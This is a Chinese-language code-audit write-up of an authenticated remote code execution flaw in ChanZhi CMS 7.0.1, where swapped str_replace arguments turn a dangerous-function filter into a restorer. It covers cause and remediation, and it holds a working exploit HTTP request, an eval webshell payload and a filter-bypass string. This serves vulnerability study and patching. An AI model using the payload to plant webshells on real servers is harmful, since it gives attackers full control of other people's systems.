---
title: 蝉知CMS 7.0.1 后台模板编辑 str_replace 数组参数颠倒导致任意代码执行漏洞分析
description: 深度分析蝉知CMS 7.0.1版本中后台模板编辑功能因str_replace函数参数顺序错误导致的任意代码执行漏洞，包含漏洞复现、代码审计溯源及修复建议。
category: program-analysis
tags:
- 蝉知CMS
- CMS漏洞
- 代码审计
- 任意代码执行
- str_replace
- 后台Getshell
- PHP安全
date: '2023-04-13'
updated: '2026-11-15'
---

## 漏洞概述

蝉知企业门户系统（ChanZhi CMS）V7.0.1 版本在后台模板编辑功能中存在任意代码执行漏洞。攻击者只需拥有后台管理员权限，通过编辑模板功能即可在服务器上写入 Webshell，进而完全控制服务器。

**核心成因**：模型层 `writeViewFile` 方法中使用 `str_replace` 进行危险函数过滤时，两个替换数组参数顺序颠倒，导致原本应被过滤的危险函数反而被保留甚至还原，直接写入文件。

## 影响版本

- 蝉知CMS V7.0.1

## 漏洞复现

### 前置条件
- 拥有后台管理员账号密码

### 复现步骤
1. 登录后台，进入 **设计** -> **编辑模板**
2. 选择任意模板文件进行编辑
3. 抓包修改请求，在模板内容中植入 PHP 代码（如 `<?php eval($_POST[1]);?>`）
4. 保存后直接生成可访问的 Webshell 文件

### 请求示例
```http
POST /admin.php?m=ui&f=edittemplate HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

module=default&file=header.php&content=<?php eval($_POST[1]);?>
```

## 代码审计分析

### 控制层入口

**文件**：`system/module/ui/control.php`  
**关键行**：788-797

```php
$template = $this->config->template->{$this->app->clientDevice}->name;
if($_POST) {
    $canManage = array('result' => 'success');
    if(!$this->loadModel('guarder')->verify()) 
        $canManage = $this->loadModel('common')->verifyAdmin();
    if($canManage['result'] != 'success') {
        // 验证失败处理
    }
    $result = $this->ui->writeViewFile($template, $this->post->module, $this->post->file);
    if($result) {
        $this->send(array('result' => 'success', ...));
    } else {
        $this->send(array('result' => 'fail', 'message' => $this->lang->fail));
    }
}
```

逻辑流程：
1. 获取当前客户端设备对应的模板名称
2. 检测 POST 请求
3. 权限验证（guarder 验证或管理员验证）
4. 调用模型层 `writeViewFile` 执行文件写入

### 模型层写入逻辑

**文件**：`system/module/ui/model.php.php`  
**方法**：`writeViewFile`（第 1523 行起）

```php
public function writeViewFile($template, $module, $file) {
    $file = $this->getExtFile($template, $module, $file);  // 获取完整路径
    $filePath = dirname($file);
    if(!is_dir($filePath)) mkdir($filePath, 0777, true);  // 创建目录
    
    $gibbedEvils = array('e val', 'assert', 'system', 'shell_exec', 'passthru', ...);  // 带空格的"安全"版本
    $evils = array('eval', 'assert', 'system', 'shell_exec', 'passthru', ...);  // 真实危险函数
    
    $content = str_replace($gibbedEvils, $evils, $this->post->content);  // 关键缺陷行
    
    if(function_exists('get_magic_quotes_gpc') and get_magic_quotes_gpc()) 
        $content = stripslashes($content);
    
    $result = file_put_contents($file, $content);
    return $result;
}
```

### 关键缺陷：str_replace 参数颠倒

**漏洞代码**（第 1530 行）：
```php
$content = str_replace($gibbedEvils, $evils, $this->post->content);
```

**正确逻辑应为**：
```php
$content = str_replace($evils, $gibbedEvils, $this->post->content);
```

**数组定义对比**：

| 数组变量 | 内容示例 | 含义 |
|----------|----------|------|
| `$gibbedEvils` | `'e val', 'as sert', 'sy stem'` | 人为插入空格使函数名失效的"安全"版本 |
| `$evils` | `'eval', 'assert', 'system'` | 真实可执行的危险函数名 |

**攻击效果**：
- 开发者意图：将用户输入中的真实危险函数（`$evils`）替换为失效版本（`$gibbedEvils`）
- 实际执行：将失效版本（`$gibbedEvils`）替换为真实危险函数（`$evils`）
- 结果：攻击者只需提交带空格的版本（如 `e val`），经替换后变为可执行的 `eval`

**绕过示例**：
```php
// 攻击者提交
e val($_POST[1]);

// 经 str_replace 处理后变为
eval($_POST[1]);
```

## 修复方案

**文件**：`system/module/ui/model.php.php`  
**修复位置**：第 1524 行后添加路径规范化，第 1530 行重写过滤逻辑

```php
// 1524 行后添加：获取纯文件名，防止目录遍历
$file = basename($file);

// 1530 行替换为：
// 过滤 PHP 标签（大小写不敏感）
$content = str_ireplace('<?php', '', $content);
$content = str_ireplace('<?', '', $content);

// 危险函数过滤：将真实函数名替换为失效版本
$evils = array('eval', 'assert', 'system', 'shell_exec', 'passthru', ...);
$gibbedEvils = array('e val', 'as sert', 'sy stem', 's hell_exec', 'pas stru', ...);
$content = str_replace($evils, $gibbedEvils, $content);

// 保留原有魔术引号处理
if(function_exists('get_magic_quotes_gpc') and get_magic_quotes_gpc()) 
    $content = stripslashes($content);
```

**修复要点**：
1. 使用 `basename()` 限制文件名，防止路径遍历
2. 使用 `str_ireplace` 大小写不敏感过滤 PHP 标签
3. 修正 `str_replace` 参数顺序：`$evils` -> `$gibbedEvils`
4. 保持对 `get_magic_quotes_gpc` 的兼容处理

## 交叉引用与相关资源

### 同类 CMS 漏洞分析
- [[metinfo-612-sql-injection-analysis]] — MetInfo 6.1.2 SQL 注入漏洞代码审计，展示 CMS 通用审计方法论
- [[arbitrary-file-download-vulnerability-analysis]] — HDWiki 任意文件下载/删除漏洞，组件级代码审计视图

### PHP 安全基础
- [[php-webshell-fundamentals-chopper-analysis]] — PHP Webshell 原理、连接流程与持久化技术
- [[php-file-inclusion-vulnerability]] — PHP 文件包含漏洞成因与伪协议利用链
- [[php-non-alphanumeric-webshell-construction]] — 非字母数字 Webshell 构造技巧

### 代码审计方法论
- [[xd-security-code-audit-notes-day50-57]] — XD安全代码审计笔记：关键字搜索策略、框架审计要点、CMS 实战案例
- [[oasys-system-code-audit]] — Oasys 系统代码审计实战：MyBatis SQL注入、Fastjson、文件上传、垂直越权等六类漏洞挖掘全链路

### 红队实战视角
- [[backdoor-persistence-techniques]] — 渗透测试中常见后门持久化技术分类与实战手法
- [[redteam-hw-opsec-guidelines]] — HW 红队演练全流程 OPSEC 守则：环境隔离、工具指纹清洗、C2 隐匿、日志反取证

## 时间线
- **2023-04-13** 微信公众号发布漏洞分析文章
- **漏洞发现** 具体披露时间未标注，版本锁定为 V7.0.1

## 参考来源
- 原文：[蝉知CMS7.0.1后台模板Getshell](http://mp.weixin.qq.com/s?__biz=MzI4MDE5ODExNQ==&mid=2652901373&idx=1&sn=36e0568da8ca1703f6b05c61d3246af3&chksm=f0688171c71f0867855a6337b8124a3b2c1ff8d24f3b60f4f6e63db3a2ea524c169bae734101&scene=126&sessionid=1681399987#rd)

## 来源

- [226安全团队-201805-202103_41](../sources/226安全团队-201805-202103_41.md)
